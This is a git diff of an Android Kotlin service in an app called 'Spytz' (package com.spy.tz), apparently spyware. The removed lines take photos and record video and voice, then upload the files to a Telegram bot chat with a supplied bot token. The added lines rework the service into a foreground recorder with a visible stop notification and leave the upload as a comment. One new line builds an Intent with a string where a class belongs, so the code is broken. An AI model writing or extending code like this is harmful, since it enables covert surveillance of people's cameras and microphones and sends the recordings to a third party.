@@ -2,10 +2,11 @@ package com.spy.tz
 
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.app.PendingIntent
 import android.app.Service
 import android.content.Intent
+import android.os.Build
 import android.os.IBinder
-import android.util.Log
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -14,101 +15,94 @@ import kotlinx.coroutines.launch
 
 class NotificationService : Service() {
 
-    private var notificationManager: NotificationManager? = null
-    private var notificationBuilder: NotificationCompat.Builder? = null
-    private val scope = CoroutineScope(Dispatchers.Main + Job())
-    
-    private lateinit var botHelper: TelegramBotHelper
-    private var botToken: String = ""
-    private var chatId: Long = 0L
+    private var serviceJob: Job? = null
+    private var isRecording = false
+    private var recordingType: String = "" // "VIDEO" or "AUDIO"
+    private lateinit var telegramBotHelper: TelegramBotHelper
+
+    companion object {
+        const val CHANNEL_ID = "Spytz_Service_Channel"
+        const val NOTIFICATION_ID = 1
+        const val ACTION_STOP_RECORDING = "com.spy.tz.STOP_RECORDING"
+    }
 
     override fun onCreate() {
         super.onCreate()
-        notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
-        
-        // Create Channel
-        val channel = NotificationChannel("SPYTZ_CHANNEL", "Spytz Notifications", NotificationManager.IMPORTANCE_LOW)
-        notificationManager?.createNotificationChannel(channel)
-        
-        notificationBuilder = NotificationCompat.Builder(this, "SPYTZ_CHANNEL")
-            .setSmallIcon(android.R.drawable.ic_menu_camera)
-            .setContentTitle("Spytz Active")
-            .setContentText("Monitoring...")
-            .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-
-        startForeground(1, notificationBuilder?.build()!!)
+        createNotificationChannel()
+        telegramBotHelper = TelegramBotHelper(this)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        botToken = intent?.getStringExtra("BOT_TOKEN") ?: ""
-        chatId = intent?.getLongExtra("CHAT_ID", 0L) ?: 0L
-        
-        botHelper = TelegramBotHelper(this)
-        
-        // If you have a Camera View in your UI, initialize it here or from Activity
-        // For this service example, we assume basic commands are triggered via broadcast or local events
-        
+        when (intent?.action) {
+            "START_VIDEO" -> {
+                isRecording = true
+                recordingType = "VIDEO"
+                startForeground(NOTIFICATION_ID, createNotification("Video Recording...", true))
+            }
+            "START_AUDIO" -> {
+                isRecording = true
+                recordingType = "AUDIO"
+                startForeground(NOTIFICATION_ID, createNotification("Voice Recording...", true))
+            }
+            ACTION_STOP_RECORDING -> {
+                stopRecordingAndNotify()
+            }
+        }
         return START_STICKY
+    }
+
+    private fun stopRecordingAndNotify() {
+        isRecording = false
+        if (recordingType == "VIDEO") {
+            val file = telegramBotHelper.stopVideoRecording()
+            // Here you can trigger upload logic from your Main Activity or Bot Handler
+            // For now, we just log it. You should expose a callback or broadcast.
+            android.util.Log.d("NotificationService", "Video Stopped. File: $file")
+        } else if (recordingType == "AUDIO") {
+            val file = telegramBotHelper.stopVoiceRecording()
+            android.util.Log.d("NotificationService", "Audio Stopped. File: $file")
+        }
+        
+        stopForeground(true)
+        stopSelf()
+    }
+
+    private fun createNotification(title: String, showProgress: Boolean): NotificationCompat.Builder {
+        val intent = Intent(this, ACTION_STOP_RECORDING).apply {
+            `package` = packageName
+        }
+        
+        val pendingIntent = PendingIntent.getService(
+            this,
+            0,
+            intent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Spytz Pro - ${if(recordingType=="VIDEO") "Video" else "Audio"} Rec")
+            .setContentText(title)
+            .setSmallIcon(R.drawable.ic_notification) // Ensure you have an icon in res/drawable
+            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Stop", pendingIntent)
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .setOngoing(true)
+    }
+
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "Spytz Background Service",
+                NotificationManager.IMPORTANCE_LOW
+            ).apply {
+                description = "Shows recording status"
+            }
+            val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
+            notificationManager.createNotificationChannel(channel)
+        }
     }
 
     override fun onBind(intent: Intent?): IBinder? {
         return null
-    }
-
-    // --- COMMAND HANDLERS ---
-
-    fun handleSwitchCamera() {
-        // Requires Activity reference usually, but here we log or trigger UI update
-        Log.d("NotificationService", "Switching Camera")
-        // Note: Actual UI switching needs Activity context. 
-        // If you just want to toggle backend state, do it here.
-    }
-
-    fun handleTakePhoto(isBack: Boolean) {
-        scope.launch {
-            val result = botHelper.takePhoto(isBack)
-            if (result.isSuccess) {
-                val file = result.getOrNull()
-                if (file != null && file.exists()) {
-                    val uploadResult = botHelper.sendPhotoToBot(file, chatId, botToken, "Captured Photo")
-                    if (uploadResult.isFailure) {
-                        Log.e("NotificationService", "Failed to send photo: ${uploadResult.exceptionOrNull()?.message}")
-                    }
-                }
-            }
-        }
-    }
-
-    fun handleStartVideoRecording() {
-        botHelper.startVideoRecording()
-    }
-
-    fun handleStopVideoRecording() {
-        scope.launch {
-            val file = botHelper.stopVideoRecording()
-            if (file != null && file.exists()) {
-                val uploadResult = botHelper.sendVideoToBot(file, chatId, botToken, "Recorded Video")
-                if (uploadResult.isFailure) {
-                    Log.e("NotificationService", "Failed to send video: ${uploadResult.exceptionOrNull()?.message}")
-                }
-            }
-        }
-    }
-
-    fun handleStartVoiceRecording() {
-        botHelper.startVoiceRecording()
-    }
-
-    fun handleStopVoiceRecording() {
-        scope.launch {
-            val file = botHelper.stopVoiceRecording()
-            if (file != null && file.exists()) {
-                val uploadResult = botHelper.sendVoiceToBot(file, chatId, botToken)
-                if (uploadResult.isFailure) {
-                    Log.e("NotificationService", "Failed to send voice: ${uploadResult.exceptionOrNull()?.message}")
-                }
-            }
-        }
     }
 }
